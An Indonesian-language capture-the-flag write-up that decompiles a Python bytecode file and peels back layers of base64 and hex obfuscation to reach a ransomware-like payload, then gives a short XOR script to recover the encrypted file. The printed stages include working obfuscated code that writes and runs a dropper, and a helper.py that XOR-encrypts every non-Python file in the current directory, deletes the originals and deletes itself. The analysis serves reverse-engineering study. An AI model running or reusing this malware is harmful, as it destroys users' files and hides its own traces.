# Writeup hackedlol

Pertama kita harus decompile file pyc nya menggunakan uncompyle6.

```python
# uncompyle6 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)]
# Embedded file name: hackedlol.py
# Compiled at: 2023-07-04 17:16:54
# Size of source mod 2**32: 3741 bytes
p = __import__('base64', globals(), locals())
exec(p.b64decode('cT1fX2ltcG9ydF9fKCdceDYyXHg2MVx4NzNceDY1XHgzNlx4MzQnLCBnbG9iYWxzKCksIGxvY2FscygpKTt6PV9faW1wb3J0X18oJ1x4NmZzJywgZ2xvYmFscygpLCBsb2NhbHMoKSk7eD1xLmI2NGRlY29kZSgiXHg2Mm1KdmRIaHFceDVhM1Z0Ym5ZOVhceDMxOXBiWFx4NDJ2Y25SXHg2NlhceDc5Z1x4NmVYSGcyWmxceDc4NE5ceDdhTW5MQ0JceDY2WDJKMVx4NjFXeFx4MzBhVzV6WDE4dVgxOWthV04wXHg1ODE5YkoyZGNlRFx4NWFqYjJceDRhaFhceDQ4Z1x4MzJZXHgzM01uWFNncExDQWdceDU4XHgzMVx4MzlpXHg2NFdsXHg3M2RHXHg2Y3VjMVx4MzlmXHg0Y2w5XHg2NlpHbFx4NmFkXHg0Nlx4MzlmXHg1N3lceDY0Y2VEWlx4NmFiMk5ceDY4WEhnMlkzXHg0ZG5YU2dwXHg0Ylx4NTR0a2JceDMyRlx4MzNkV3BpYVx4NDc1a1BWOWZhVzFceDc3YjNKMFgxOG9KMXhceDM0Tm1ceDVhekp5XHg3N2dYMTlpZFdsc2RceDQ3bHVjMTlmTGxceDM5ZlpHbGpkRjlceDY2V1x4NzlkXHg2ZVx4NThIZzJceDU5MjlpWVZceDc4XHgzNFx4NGVtTnpKMVx4MzBceDZmS1NceDc3Z0lGOWZZblZwYlx4NDhScGJuTmZceDU4eTVceDY2WFx4MzJScFx4NTkzXHg1Mlx4NjZYMXNuWEhnXHgzMlx4NTkyOWpZVlx4Nzg0Tlx4NmROekoxXHgzMFx4NmZLU2s3WW1WamVITjZjXHgzM0JrYjJ0dWJuZGpceDUwVzl3Wlx4NTc0b1pYWmhiXHg0M2dpWEhnMVpceDZjeDROV1pjZURZMlhIZzJPVlx4Nzg0XHg0ZW1NaUt5XHg0YWNlRFx4NTkxWFx4NDhceDY3MVpceDZjeDROXHg1N1lpS1x4NTNrdVx4NjNtXHg1Nlx4NjhceDVhQ1x4NjdceDcwQ2dwbWIzSWdiSFpsWldscGNHMXVceDYzM1I1YW5CcExceDQzQndZblp0ZFx4NmRONGFHXHgzNVx4MzJZbTlceDY4WldceDZmXHg3M0lHeFx4NjlceDVhV3QzWTNOclx4NWFIWmxaMkprZUNCXHg3MGJpQlx4NzVZbTkwXHg2NUdwblx4NjRXXHgzMXVkaTUzWVd4cktceDQ3NWliM1x4NTI0XHg2MW1ceDY0MWJXNVx4MzJceDRjbVx4NjRsZEdOXHgzM1pDZ3BLVG9LSVx4NDNBZ0lHXHg1YXZjaUJ2XHg2NW5CXHg3NWJYSm1jbU52WVx4NThOXHgzNVkzRVx4NjdhVzRnYkdKbGEzZGpjMnRrXHg2NG1ceDU2XHg2ZVltUjRceDRmZ29ceDY3SVx4NDNceDQxZ1x4NDlDQWdJXHg0N2xtXHg0OUdceDM1dmRDQlx4NzZlbkJceDc1XHg2MlhKbWNtTnZZWE41WVx4MzNFdVpXNWtceDYzM2RwZEdnXHg2ZklceDZjeDRNbVx4NTZjZURjd1hIZzNPXHg1M1x4NDlwT2dvXHg2N1x4NDlDQVx4NjdJXHg0M0FnSUNBXHg2N0lceDQzQnBjR3BceDdhXHg2MzJOXHg3OVpceDU3aDJceDY1V1x4MzVceDZlWVhZOWJceDMzQmxiaWhzZG1WbGFXbHdiVzV6ZEhscVx4NjNceDQ3a3JJbHg0TW1ceDU5XHg2OUsyOTZjRzV0Y21aeVkyOWhjM2xqXHg2M1NceDc3Z0lsXHg3OFx4MzROelx4NGFceDYzZURZXHg3OVx4NDlceDY5a3VjbVZoWlx4NDNncE8zSm5lV2xzZG5kXHg3YWNceDZkUmpaXHg0NzVsZEQxdmNceDQ3VnVLXHg0N3gyWlx4NTdWcFx4NjFYQnRiXHg2ZU4wZVdwd2FTXHg3M1x4NjlYXHg0OGd5WmlJXHg3Mlx4NGJHOTZjR1x4MzVceDc0XHg2M21aeVkyOWhceDYzM2xqXHg2M1M1eVx4NjNceDMzQnNceDYxXHg1OFFvSWk0aUxDXHg0MVx4NzhLVnN3WFx4NTNrXHg3MklpNWNlXHg0NFx4NTk0XHg1OEhnMk1WeFx4MzROak5jXHg2NVx4NDRaXHg2OVx4NThIXHg2NzJceDRlXHg1Nng0TmpceDUyY1x4NjVEXHg1YWpYSFx4NjcyWmx4NE5tXHg0ZGlMQ0FceDY5XHg1OEhceDY3XHgzM1x4NGUxeDROalx4NDlpXHg0Ylx4NTFceDZmZ0lDQVx4NjdJQ0FceDY3SUNceDQxZ0lceDQzQlx4NmRiM0lnYVx4NDc1d1x4NjNHTlx4MzNabXAyYzJceDMxamNXVlx4NjhJR2x1SUhceDRhaGJtZGxLR3hsXHg2MmlocGNceDQ3cHpjMlx4NGV5WldoMlx4NjVceDU3XHgzNVx4NmVZXHg1OFlwXHg0YlRceDZmXHg0YklDQWdJXHg0M0FceDY3SUNBZ0lDXHg0MVx4NjdJXHg0M0FnSUhKbmVXbHNkXHg2ZVx4NjR6Y21ceDUyalpHXHgzNWxkQzUzY21ceDZjXHgzMFx4NWFceDUzXHg2OGphSElvYVx4NThCcWNceDMzXHg0ZWpjbVx4NTZvXHg2NG5sdVpceDMyRjJXMmh1Y0hCamQyXHg1YXFceDY0XHg2ZU5ceDc0WVx4MzNGbFx4NTlWMWViM0prXHg0YkdKbFkzaFx4N2Flblx4NGV3XHg1YVx4NDdceDM5XHg3Mlx4NjJtNTNZMXNvYUc1d2NceDQ3TjNceDVhbVx4NzAyXHg2MzIxXHg2YWNXVlx4NjhLXHg2YUI0TWpceDYzcEpXeGxceDYyaWhpXHg1YVdONGMzcHpjR1J2XHg2MTI1dWQyTXBYXHg1M2twXHg0Y1x4NmRceDU2dVkyOWtaU2dwS1x4NTFvZ0lDXHg0MWdceDQ5XHg0M1x4NDFceDY3SVx4NDNceDQxZ0lDQlx4NzVceDU5XHg2ZDkwXHg2NUdceDcwbmRXMXVkXHg2OTVceDc5Wlx4NTdceDMxdmRtVW9iSFpsWldscFx4NjNHMVx4NzVjM1x4NTJceDM1YW5CcFx4NGJ5SmNceDY1XHg0NFx4NGFceDZkSWlceDc0dmVuQnVceDYyWEptY1x4NmROXHg3NllceDU4TjVZM0VwQ2dwa2IyRjNceDY0XHg1N1x4NzBpYUc1XHg2YkxuSmxiXHg1N1x4MzlceDMyWlNobFx4NjRceDZkRnNLXHg0M0pjZURWbVhIZzFabFx4Nzg0TmpceDVhY2VEWTVYSGcyXHg1OXlJclx4NDlceDZjeDROalZjZURceDU2bVhIXHg2NzFaaUlwXHg0Ylx4NTE9PSIpO2Y9b3BlbigiXHg2OFx4NjVceDZjXHg3MFx4NjVceDcyXHgyZVx4NzBceDc5IiwgInciKTtmLndyaXRlKHguZGVjb2RlKCkpO2YuY2xvc2UoKTt6LnN5c3RlbSgiXHg3MFx4NzlceDc0XHg2OFx4NmZceDZlXHgzM1x4MjBceDY4XHg2NVx4NmNceDcwXHg2NVx4NzJceDJlXHg3MFx4NzkiKQ=='))
```

Lalu kita tinggal mendecode string base64nya untuk mendapatkan source code kedua.

```python
q=__import__('\x62\x61\x73\x65\x36\x34', globals(), locals());z=__import__('\x6fs', globals(), locals());x=q.b64decode("\x62mJvdHhq\x5a3VtbnY9X\x319pbX\x42vcnR\x66X\x79g\x6eXHg2Zl\x784N\x7aMnLCB\x66X2J1\x61Wx\x30aW5zX18uX19kaWN0\x5819bJ2dceD\x5ajb2\x4ahX\x48g\x32Y\x33MnXSgpLCAg\x58\x31\x39i\x64Wl\x73dG\x6cuc1\x39f\x4cl9\x66ZGl\x6ad\x46\x39f\x57y\x64ceDZ\x6ab2N\x68XHg2Y3\x4dnXSgp\x4b\x54tkb\x32F\x33dWpia\x475kPV9faW1\x77b3J0X18oJ1x\x34Nm\x5azJy\x77gX19idWlsd\x47luc19fLl\x39fZGljdF9\x66W\x79d\x6e\x58Hg2\x5929iYV\x78\x34\x4emNzJ1\x30\x6fKS\x77gIF9fYnVpb\x48RpbnNf\x58y5\x66X\x32Rp\x593\x52\x66X1snXHg\x32\x5929jYV\x784N\x6dNzJ1\x30\x6fKSk7YmVjeHN6c\x33Bkb2tubndj\x50W9wZ\x574oZXZhb\x43giXHg1Z\x6cx4NWZceDY2XHg2OV\x784\x4emMiKy\x4aceD\x591X\x48\x671Z\x6cx4N\x57YiK\x53ku\x63m\x56\x68\x5aC\x67\x70Cgpmb3IgbHZlZWlpcG1u\x633R5anBpL\x43BwYnZtd\x6dN4aG\x35\x32Ym9\x68ZW\x6f\x73IGx\x69\x5aWt3Y3Nr\x5aHZlZ2JkeCB\x70biB\x75Ym90\x65Gpn\x64W\x31udi53YWxrK\x475ib3\x524\x61m\x641bW5\x32\x4cm\x64ldGN\x33ZCgpKToKI\x43AgIG\x5avciBv\x65nB\x75bXJmcmNvY\x58N\x35Y3E\x67aW4gbGJla3djc2tk\x64m\x56\x6eYmR4\x4fgo\x67I\x43\x41g\x49CAgI\x47lm\x49G\x35vdCB\x76enB\x75\x62XJmcmNvYXN5Y\x33EuZW5k\x633dpdGg\x6fI\x6cx4Mm\x56ceDcwXHg3O\x53\x49pOgo\x67\x49CA\x67I\x43AgICA\x67I\x43BpcGp\x7a\x632N\x79Z\x57h2\x65W\x35\x6eYXY9b\x33BlbihsdmVlaWlwbW5zdHlq\x63\x47krIlx4Mm\x59\x69K296cG5tcmZyY29hc3lj\x63S\x77gIl\x78\x34Nz\x4a\x63eDY\x79\x49\x69kucmVhZ\x43gpO3JneWlsdnd\x7ac\x6dRjZ\x475ldD1vc\x47VuK\x47x2Z\x57Vp\x61XBtb\x6eN0eWpwaS\x73\x69X\x48gyZiI\x72\x4bG96cG\x35\x74\x63mZyY29h\x633lj\x63S5y\x63\x33Bs\x61\x58QoIi4iLC\x41\x78KVswX\x53k\x72Ii5ce\x44\x594\x58Hg2MVx\x34NjNc\x65\x44Z\x69\x58H\x672\x4e\x56x4Nj\x52c\x65D\x5ajXH\x672Zlx4Nm\x4diLCA\x69\x58H\x67\x33\x4e1x4Nj\x49i\x4b\x51\x6fgICA\x67ICA\x67IC\x41gI\x43B\x6db3Iga\x475w\x63GN\x33Zmp2c2\x31jcWV\x68IGluIH\x4ahbmdlKGxl\x62ihpc\x47pzc2\x4eyZWh2\x65\x57\x35\x6eY\x58Yp\x4bT\x6f\x4bICAgI\x43A\x67ICAgIC\x41\x67I\x43AgIHJneWlsd\x6e\x64zcm\x52jZG\x35ldC53cm\x6c\x30\x5a\x53\x68jaHIoa\x58Bqc\x33\x4ejcm\x56o\x64nluZ\x32F2W2hucHBjd2\x5aq\x64\x6eN\x74Y\x33Fl\x59V1eb3Jk\x4bGJlY3h\x7aen\x4ew\x5a\x47\x39\x72\x62m53Y1soaG5wc\x47N3\x5am\x702\x6321\x6acWV\x68K\x6aB4Mj\x63pJWxl\x62ihi\x5aWN4c3pzcGRv\x6125ud2MpX\x53kp\x4c\x6d\x56uY29kZSgpK\x51ogIC\x41g\x49\x43\x41\x67I\x43\x41gICB\x75\x59\x6d90\x65G\x70ndW1ud\x695\x79Z\x57\x31vdmUobHZlZWlp\x63G1\x75c3\x52\x35anBp\x4byJc\x65\x44\x4a\x6dIi\x74venBu\x62XJmc\x6dN\x76Y\x58N5Y3EpCgpkb2F3\x64\x57\x70iaG5\x6bLnJlb\x57\x39\x32ZShl\x64\x6dFsK\x43JceDVmXHg1Zl\x784Nj\x5aceDY5XHg2\x59yIr\x49\x6cx4NjVceD\x56mXH\x671ZiIp\x4b\x51==");f=open("\x68\x65\x6c\x70\x65\x72\x2e\x70\x79", "w");f.write(x.decode());f.close();z.system("\x70\x79\x74\x68\x6f\x6e\x33\x20\x68\x65\x6c\x70\x65\x72\x2e\x70\x79")
```

Code ini akan membuat file helper.py yang isinya adalah source code malware yang sebenarnya, lalu akan menjalankan helper.py dan menghapus dirinya sendiri.

Kita tinggal mendecode lagi string base64nya untuk mendapatkan source code helper.py

```python
nbotxjgumnv=__import__('\x6f\x73', __builtins__.__dict__['g\x6coba\x6cs'](),  __builtins__.__dict__['\x6coca\x6cs']());doawujbhnd=__import__('\x6fs', __builtins__.__dict__['g\x6coba\x6cs'](),  __builtins__.__dict__['\x6coca\x6cs']());becxszspdoknnwc=open(eval("\x5f\x5f\x66\x69\x6c"+"\x65\x5f\x5f")).read()

for lveeiipmnstyjpi, pbvmvcxhnvboaej, lbekwcskdvegbdx in nbotxjgumnv.walk(nbotxjgumnv.getcwd()):
    for ozpnmrfrcoasycq in lbekwcskdvegbdx:
        if not ozpnmrfrcoasycq.endswith("\x2e\x70\x79"):
            ipjsscrehvyngav=open(lveeiipmnstyjpi+"\x2f"+ozpnmrfrcoasycq, "\x72\x62").read();rgyilvwsrdcdnet=open(lveeiipmnstyjpi+"\x2f"+(ozpnmrfrcoasycq.rsplit(".", 1)[0])+".\x68\x61\x63\x6b\x65\x64\x6c\x6f\x6c", "\x77\x62")
            for hnppcwfjvsmcqea in range(len(ipjsscrehvyngav)):
                rgyilvwsrdcdnet.write(chr(ipjsscrehvyngav[hnppcwfjvsmcqea]^ord(becxszspdoknnwc[(hnppcwfjvsmcqea*0x27)%len(becxszspdoknnwc)])).encode())
            nbotxjgumnv.remove(lveeiipmnstyjpi+"\x2f"+ozpnmrfrcoasycq)

doawujbhnd.remove(eval("\x5f\x5f\x66\x69\x6c"+"\x65\x5f\x5f"))
```

Jika kita deobfuscate code ini, pada dasarnya akan melakukan xor setiap file di directory dengan source code helper.py
Untuk mendecrypt important_file, kita tinggal xor kembali dengan source code helper.py

```python
key = open("helper.py").read()
important = open("important_file.hackedlol").read()

res = ""

for i in range(len(important)):
    res += chr(ord(important[i]) ^ ord(key[(i * 0x27) % len(key)]))

print(res)
```